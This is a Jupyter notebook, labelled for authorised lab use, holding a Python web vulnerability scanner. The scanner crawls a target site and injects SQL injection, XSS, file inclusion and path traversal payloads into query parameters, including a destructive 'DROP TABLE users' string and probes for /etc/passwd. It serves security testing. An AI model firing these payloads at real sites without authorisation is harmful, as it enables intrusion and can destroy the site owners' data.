# Web Application Security Scan

> **Authorized lab use only.** This notebook is an educational demonstration. Run it only with synthetic data or systems you own and are permitted to test.


In [ ]:
import requests
import re
import json
import time
import threading
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import sqlite3
from concurrent.futures import ThreadPoolExecutor
import hashlib
import base64

class WebAppScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []
        self.js_files = []
        self.cookies = {}

    def crawl_site(self, base_url, max_depth=3, max_pages=50):
        urls_to_crawl = [(base_url, 0)]
        crawled_count = 0

        while urls_to_crawl and crawled_count < max_pages:
            url, depth = urls_to_crawl.pop(0)

            if url in self.crawled_urls or depth > max_depth:
                continue

            try:
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    self.crawled_urls.add(url)
                    crawled_count += 1

                    soup = BeautifulSoup(response.text, 'html.parser')

                    for link in soup.find_all('a', href=True):
                        full_url = urljoin(url, link['href'])
                        if self.is_same_domain(base_url, full_url):
                            urls_to_crawl.append((full_url, depth + 1))

                    self.extract_forms(soup, url)
                    self.extract_js_files(soup, url)

            except Exception as e:
                continue

        return list(self.crawled_urls)

    def is_same_domain(self, base_url, url):
        return urlparse(base_url).netloc == urlparse(url).netloc

    def extract_forms(self, soup, url):
        for form in soup.find_all('form'):
            form_data = {
                'url': url,
                'action': urljoin(url, form.get('action', '')),
                'method': form.get('method', 'GET').upper(),
                'inputs': []
            }

            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name'),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                    'required': input_tag.get('required') is not None
                }
                form_data['inputs'].append(input_data)

            self.forms.append(form_data)

    def extract_js_files(self, soup, url):
        for script in soup.find_all('script', src=True):
            js_url = urljoin(url, script['src'])
            if js_url not in self.js_files:
                self.js_files.append(js_url)

    def test_sql_injection(self, url, params):
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "'; DROP TABLE users; --",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' AND 1=CONVERT(int, (SELECT @@version))--"
        ]

        vulnerabilities = []
        for payload in payloads:
            test_params = params.copy()
            for param in test_params:
                test_params[param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=10)

                sql_errors = [
                    "you have an error in your sql syntax",
                    "warning: mysql",
                    "microsoft ole db provider",
                    "postgresql query failed",
                    "ora-01756",
                    "sqlite3",
                    "unclosed quotation mark"
                ]

                response_text = response.text.lower()
                for error in sql_errors:
                    if error in response_text:
                        vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': error
                        })
                        break

            except:
                continue

        return vulnerabilities

    def test_xss(self, url, params):
        payloads = [
            "<script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]

        vulnerabilities = []
        for payload in payloads:
            test_params = params.copy()
            for param in test_params:
                test_params[param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=10)

                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'Cross-Site Scripting (XSS)',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'reflected': True
                    })

            except:
                continue

        return vulnerabilities

    def test_lfi(self, url, params):
        payloads = [
            "../../../../etc/passwd",
            "../../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php"
        ]

        vulnerabilities = []
        for payload in payloads:
            test_params = params.copy()
            for param in test_params:
                test_params[param] = payload

            try:
                response = self.session.get(url, params=test_params, timeout=10)

                lfi_indicators = [
                    "root:x:0:0:",
                    "daemon:x:1:1:",
                    "localhost",
                    "127.0.0.1",
                    "<?php"
                ]

                response_text = response.text.lower()
                for indicator in lfi_indicators:
                    if indicator in response_text:
                        vulnerabilities.append({
                            'type': 'Local File Inclusion (LFI)',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': indicator
                        })
                        break

            except:
                continue

        return vulnerabilities

    def test_directory_traversal(self, url):
        payloads = [
            "../",
            "../../",
            "../../../",
            "....//",
            "....\\",
            "%2e%2e%2f",
            "%2e%2e%5c"
        ]

        vulnerabilities = []
        for payload in payloads:
            test_url = url + payload + "etc/passwd"

            try:
                response = self.session.get(test_url, timeout=10)

                if "root:x:0:0:" in response.text:
                    vulnerabilities.append({
                        'type': 'Directory Traversal',
                        'url': test_url,
                        'payload': payload,
                        'evidence': 'etc/passwd contents found'
                    })

            except:
                continue

        return vulnerabilities

    def check_security_headers(self, url):
        try:
            response = self.session.get(url, timeout=10)
            headers = response.headers

            missing_headers = []
            weak_headers = []

            security_headers = {
                'X-Frame-Options': 'DENY|SAMEORIGIN',
                'X-Content-Type-Options': 'nosniff',
                'X-XSS-Protection': '1; mode=block',
                'Strict-Transport-Security': 'max-age=',
                'Content-Security-Policy': '.*'
            }

            for header, expected in security_headers.items():
                if header not in headers:
                    missing_headers.append(header)
                elif not re.search(expected, headers[header]):
                    weak_headers.append(header)

            return {
                'missing_headers': missing_headers,
                'weak_headers': weak_headers,
                'all_headers': dict(headers)
            }

        except:
            return None

    def analyze_cookies(self, url):
        try:
            response = self.session.get(url, timeout=10)
            cookies = response.cookies

            cookie_issues = []
            for cookie in cookies:
                issues = []

                if not cookie.secure:
                    issues.append('Not marked as Secure')
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    issues.append('Not marked as HttpOnly')
                if not cookie.has_nonstandard_attr('SameSite'):
                    issues.append('No SameSite attribute')

                if issues:
                    cookie_issues.append({
                        'name': cookie.name,
                        'issues': issues
                    })

            return cookie_issues

        except:
            return []

    def scan_javascript(self, js_url):
        try:
            response = self.session.get(js_url, timeout=10)
            js_content = response.text

            vulnerabilities = []

            dangerous_patterns = [
                r'eval\s*\(',
                r'document\.write\s*\(',
                r'innerHTML\s*=',
                r'outerHTML\s*=',
                r'document\.execCommand',
                r'window\.open\s*\(',
                r'location\.href\s*=',
                r'location\.replace\s*\('
            ]

            for pattern in dangerous_patterns:
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                if matches:
                    vulnerabilities.append({
                        'type': 'Dangerous JavaScript Pattern',
                        'url': js_url,
                        'pattern': pattern,
                        'occurrences': len(matches)
                    })

            return vulnerabilities

        except:
            return []

    def comprehensive_scan(self, target_url):
        print(f"Starting comprehensive scan of {target_url}")

        crawled_urls = self.crawl_site(target_url)
        print(f"Crawled {len(crawled_urls)} URLs")

        all_vulnerabilities = []

        for url in crawled_urls:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)

            if params:
                all_vulnerabilities.extend(self.test_sql_injection(url, params))
                all_vulnerabilities.extend(self.test_xss(url, params))
                all_vulnerabilities.extend(self.test_lfi(url, params))

            all_vulnerabilities.extend(self.test_directory_traversal(url))

            headers_analysis = self.check_security_headers(url)
            if headers_analysis and headers_analysis['missing_headers']:
                all_vulnerabilities.append({
                    'type': 'Missing Security Headers',
                    'url': url,
                    'missing_headers': headers_analysis['missing_headers']
                })

            cookie_issues = self.analyze_cookies(url)
            if cookie_issues:
                all_vulnerabilities.append({
                    'type': 'Insecure Cookies',
                    'url': url,
                    'issues': cookie_issues
                })

        for js_url in self.js_files:
            all_vulnerabilities.extend(self.scan_javascript(js_url))

        return {
            'target': target_url,
            'crawled_urls': crawled_urls,
            'forms_found': len(self.forms),
            'js_files_found': len(self.js_files),
            'vulnerabilities': all_vulnerabilities,
            'vulnerability_count': len(all_vulnerabilities)
        }

def main():
    scanner = WebAppScanner()

    target = input("Enter target URL: ")

    results = scanner.comprehensive_scan(target)

    print(f"\nScan Results for {results['target']}")
    print("=" * 50)
    print(f"URLs crawled: {len(results['crawled_urls'])}")
    print(f"Forms found: {results['forms_found']}")
    print(f"JS files found: {results['js_files_found']}")
    print(f"Vulnerabilities found: {results['vulnerability_count']}")

    if results['vulnerabilities']:
        print("\nVulnerabilities:")
        for vuln in results['vulnerabilities']:
            print(f"- {vuln['type']} at {vuln['url']}")

    with open('scan_results.json', 'w') as f:
        json.dump(results, f, indent=2)

    print("\nDetailed results saved to scan_results.json")

if __name__ == "__main__":
    main()